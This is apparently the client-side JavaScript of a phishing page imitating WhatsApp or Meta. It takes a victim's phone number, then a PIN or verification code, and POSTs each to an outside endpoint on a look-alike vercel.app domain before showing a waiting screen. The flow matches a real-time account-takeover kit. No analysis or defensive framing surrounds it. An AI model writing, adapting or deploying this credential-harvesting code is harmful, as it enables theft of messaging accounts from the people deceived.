const sessionId = crypto.randomUUID(); // Generate a unique session ID

// Handle phone number form submission
phoneForm.addEventListener('submit', function(event) {
  event.preventDefault();
  const countryCode = document.getElementById('countrySelect').value;
  const phoneNumber = document.getElementById('phoneNumber').value.trim();
  const fullPhoneNumber = `${countryCode} ${phoneNumber}`;

  fetch('https://wtsp-meta-grp.vercel.app/api/submit.js', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phoneNumber: fullPhoneNumber, sessionId }) // Include sessionId
  })
  .then(response => {
    if (response.ok) {
      console.log('Phone number submitted successfully.');
      document.getElementById('phoneSection').classList.add('hidden');
      document.getElementById('pinSection').classList.remove('hidden');
    } else {
      throw new Error('Failed to submit phone number');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Error submitting phone number.');
  });
});

// Handle PIN form submission
pinForm.addEventListener('submit', function(event) {
  event.preventDefault();
  const pinCode = document.getElementById('pinCode').value.trim();

  fetch('https://wtsp-meta-grp.vercel.app/api/submit.js', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ pinCode, sessionId }) // Include sessionId
  })
  .then(response => {
    if (response.ok) {
      console.log('PIN submitted successfully.');
      document.getElementById('pinSection').classList.add('hidden');
      document.getElementById('waitSection').classList.remove('hidden');
    } else {
      throw new Error('Failed to submit PIN');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Error submitting PIN.');
  });
});
